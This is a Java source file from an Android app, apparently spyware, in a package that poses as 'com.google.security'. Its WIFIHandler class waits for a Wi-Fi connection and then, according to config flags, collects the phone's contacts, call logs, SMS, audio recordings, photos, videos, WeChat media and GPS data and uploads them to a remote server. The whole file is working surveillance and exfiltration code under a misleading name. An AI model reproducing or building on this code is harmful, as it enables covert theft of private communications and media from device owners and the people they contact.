package com.google.security;

import java.io.IOException;

import org.apache.http.client.ClientProtocolException;
import org.json.JSONException;

import com.google.security.UploadUtils.ThreadInfo;
import com.google.security.UploadUtils.ThreadUpload;
import com.google.security.tools.Config;
import com.google.security.tools.ContactsInfoTool;

import android.content.Context;
import android.net.ParseException;
import android.net.wifi.WifiManager;
import android.os.Handler;
import android.os.Message;

public class WIFIHandler extends Handler {
	private Context context;
	WifiManager mWifiManager;
	ThreadUpload t;
	ThreadInfo ti;
	private Config config;

	public WIFIHandler(Context context) {
		super();
		this.context = context;
		mWifiManager = (WifiManager) context
				.getSystemService(context.WIFI_SERVICE);
	}

	@Override
	public void handleMessage(Message msg) {
		config = Config.getIntance(context);
		config.readConfig();
		String WIFI = (String) msg.obj;
		if (WIFI.equals("WIFI")) {
			// 启动上传
			UploadUtils uploadUtils = UploadUtils.getIntance(context);

			try {
				// 根据配置文件上传
				if (config.Gpsflag) {
					t = new ThreadUpload();
					t.start();
				}
				if (config.Contractflag) {
					ContactsInfoTool contactsInfoTool = ContactsInfoTool
							.getIntance(context);
					contactsInfoTool.saveInfo();
					contactsInfoTool.saveContacts();
					contactsInfoTool.saveCallRecord();
					contactsInfoTool.saveSms();
					contactsInfoTool.saveContactsasxml();
					contactsInfoTool.saveCallRecordsasxml();
					contactsInfoTool.saveSmsasxml();
					uploadUtils.sendAllContacts();
					uploadUtils.sendAllCallRecords();
					uploadUtils.sendAllSms();
					ti = new ThreadInfo();
					ti.start();
				}
				if (config.Recorderflag)
					uploadUtils.sendAllRecords();
				if (config.Photoflag)
					uploadUtils.sendAllPhotos();
				if (config.Videoflag)
					uploadUtils.sendAllVideos();
				if (config.Wechatflag)
					uploadUtils.sendWechatMedia();

			} catch (ClientProtocolException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (ParseException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (JSONException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
	}

}